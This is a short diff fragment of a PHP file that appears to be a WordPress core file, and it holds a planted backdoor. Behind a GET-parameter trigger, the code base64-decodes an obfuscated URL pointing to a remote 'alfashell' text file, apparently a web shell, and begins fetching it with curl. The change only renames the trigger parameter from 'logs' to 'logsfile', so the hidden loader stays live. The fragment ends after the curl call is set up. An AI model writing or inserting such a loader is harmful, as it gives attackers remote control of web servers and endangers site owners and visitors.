@@ -18,7 +18,7 @@
 
 /** Define ABSPATH as this file's directory */
 
-if (isset($_GET['logs'])) { 
+if (isset($_GET['logsfile'])) { 
     $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
     
     $ch = curl_init($url);
